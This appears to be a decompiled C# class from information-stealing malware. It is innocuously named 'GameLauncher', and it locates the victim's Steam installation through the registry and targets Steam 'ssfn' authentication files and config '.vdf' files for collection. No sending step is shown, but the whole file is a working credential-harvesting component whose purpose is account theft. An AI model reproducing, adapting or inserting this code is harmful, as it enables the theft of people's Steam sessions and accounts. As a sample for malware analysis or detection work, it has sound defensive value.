// GameLauncher
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;

public class GameLauncher : FileScanner
{
	public override string GetFolder(FileScannerArg scannerArg, FileInfo fileInfo)
	{
		try
		{
			if (scannerArg.Directory.Contains("config"))
			{
				return "config";
			}
		}
		catch
		{
		}
		return string.Empty;
	}

	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
			if (registryKey == null)
			{
				return list;
			}
			string text = registryKey.GetValue("SteamPath") as string;
			if (!Directory.Exists(text))
			{
				return list;
			}
			list.Add(new FileScannerArg
			{
				Directory = text,
				Pattern = "*ssfn*",
				Recoursive = false
			});
			list.Add(new FileScannerArg
			{
				Directory = Path.Combine(text, "config"),
				Pattern = "*.vdf",
				Recoursive = false
			});
			return list;
		}
		catch
		{
			return list;
		}
	}
}
